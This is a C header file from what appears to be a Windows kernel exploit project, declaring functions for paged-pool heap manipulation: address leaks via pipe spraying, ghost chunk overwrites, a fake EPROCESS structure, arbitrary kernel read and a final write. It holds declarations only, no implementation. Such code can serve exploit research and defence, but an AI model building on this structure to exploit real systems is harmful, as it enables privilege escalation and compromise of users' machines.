#ifndef PAGEDPOOL_UTILS_H
#define PAGEDPOOL_UTILS_H

#include "exploit.h"
#include "pipe_utils.h"

int pp_get_leak(xploit_t * xploit, pipe_spray_t * respray);
void pp_setup_ghost_overwrite(xploit_t * xploit, char * ghost_overwrite_buf);
void pp_alloc_ghost_chunk(xploit_t * xploit, char * buffer);
void pp_alloc_fake_eprocess(xploit_t * xploit, char * fake_eprocess_buf);
void pp_exploit_arbitrary_read(xploit_t * xploit, uintptr_t where, char * out, size_t size);
void pp_free_ghost_chunk(xploit_t * xploit);
void pp_setup_final_write(xploit_t * xploit, char * buffer);
uintptr_t pp_find_file_object(xploit_t * xploit);

#endif